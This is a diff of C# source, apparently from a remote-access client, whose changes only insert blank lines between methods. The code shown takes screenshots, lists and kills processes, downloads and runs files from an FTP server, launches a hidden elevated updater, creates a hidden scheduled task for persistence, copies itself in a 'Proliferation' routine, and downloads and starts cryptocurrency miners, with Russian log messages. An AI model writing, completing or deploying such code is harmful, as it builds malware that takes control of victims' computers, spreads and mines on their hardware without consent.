@@ -19,10 +19,12 @@ namespace ClientWorker
         {
             _currentServer = currentServer;
         }
+
         public void UploadDirectory(string dirPath, string uploadPath)
         {
             FileManager.UploadDirectory(dirPath, uploadPath);
         }
+
         public IDirectoryInfo GetDirectoryFiles(string path,string searchPattern)
         {
             IDirectoryInfo directoryInfo = new IDirectoryInfo();
@@ -37,6 +39,7 @@ namespace ClientWorker
 
             return directoryInfo;
         }
+
         public List<string> GetDrives()
         {
             List<string> result = new List<string>();
@@ -47,10 +50,12 @@ namespace ClientWorker
             }
             return result;
         }
+
         public string GetKey()
         {
             return Service.Properties.Settings.Default.Key;
         }
+
         public List<string> GetListProc()
         {
             List<string> result = new List<string>();
@@ -68,6 +73,7 @@ namespace ClientWorker
 
             return result;
         }
+
         public List<string> GetLog()
         {
             return SendLogList();
@@ -80,6 +86,7 @@ namespace ClientWorker
             t = infoDevice.AskedInfoDevice();
             return t;
         }
+
         public Bitmap ScreenShot()
         {
             Bitmap BM = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
@@ -87,34 +94,42 @@ namespace ClientWorker
             GH.CopyFromScreen(0, 0, 0, 0, BM.Size);
             return BM;
         }
+
         public void DownloadFloader(string ftpPath, string localPath)
         {
             FileManager.DownloadFloader(ftpPath, localPath);
         }
+
         public void DownloadF(string FileName, string localPath)
         {
             FileManager.Download(FileName, localPath);        
         }
+
         public void DownloadAndRun(string file,string localPath, string verb, string args, ProcessWindowStyle style, bool useShellExecute)
         {
             FileManager.DownloadFileAndRun(file, localPath, verb, args, style,useShellExecute);
         }
+
         public void DownloadUpdate()
         {
             GetUpd();
         }
+
         public void RunProgram(string file, string verb, string args, ProcessWindowStyle style, bool useShellExecute)
         {
             FileManager.RunProc(file, verb, args, style, useShellExecute);
         }
+
         public void Reconnect()
         {
             _currentServer.ReConnect();
         }
+
         public void DeleteFile(string file)
         {
             FileManager.DeleteFile(file);
         }
+
         public void KillProcess(string procName)
         {
             foreach (Process process in Process.GetProcessesByName(procName))
@@ -122,6 +137,7 @@ namespace ClientWorker
                 process.Kill();
             }
         }
+
         public ISetting GetSetting()
         {
             ISetting setting = new ISetting
@@ -141,17 +157,20 @@ namespace ClientWorker
 
             return setting;
         }
+
         public void SetCompName(string newName)
         {
             Service.Properties.Settings.Default.Comp_name = newName;
             Service.Properties.Settings.Default.Save();
         }
+
         public void SetMSettings(string ftpFloader, string localFloader, string fileName, string args, bool isMiner, DDMiners valute)
         {
             MClass.SetM(ftpFloader, localFloader, fileName, args, isMiner,valute);
             MClass.Stop();
             if (valute != DDMiners.none) MClass.DownloadM();
         }
+
         public void GetUpd()
         {
             string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
@@ -159,6 +178,7 @@ namespace ClientWorker
                 FtpClient.DownloadF(StartData.updater, folderPath + StartData.floaderNewCopy);        
             FileManager.RunProc(folderPath + StartData.floaderNewCopy + StartData.updater, "runas", "", ProcessWindowStyle.Hidden, false); ;              
         }
+
         private void KillUpdater()
         {
             try
@@ -178,6 +198,7 @@ namespace ClientWorker
                 Log.Send("Не удалось удалить Updater: "+ex.Message);
             }
         }
+
         private List<string> SendLogList()
         {
             List<string> message = new List<string>();
@@ -187,6 +208,7 @@ namespace ClientWorker
             }
             return message;
         }
+
         public static void Registration()
         {
             Log.Send("Registration()");
@@ -194,6 +216,7 @@ namespace ClientWorker
             CreateTask(folderPath + StartData.floaderNewCopy);
             Proliferation(folderPath);
         }
+
         public static void Proliferation(string parth)
         {
             Log.Send("Proliferation()");
@@ -212,6 +235,7 @@ namespace ClientWorker
                 Log.Send("Ошибка копирования :" + ex.Message);
             }
         }
+
         public static void CreateTask(string fileParth)
         {
             new Process
@@ -224,26 +248,32 @@ namespace ClientWorker
                     WindowStyle = ProcessWindowStyle.Hidden
                 }
             }.Start();
+
             Log.Send("Задача создана");
         }
+
         public void Disconnect()
         {
             Environment.Exit(0);
         }
+
         public void RunM()
         {
             MClass.Start();
         }
+
         public void StartChat()
         {
             ChatForm chat = new ChatForm(_currentServer);
             Thread myThread = new Thread(() => Application.Run(chat));
             myThread.Start(); 
         }
+
         public void StopChat()
         {
             ChatForm.current.Close();
         }
+
         public void ReadMessage(string message)
         {
             ChatForm.current.AddMessage(message);
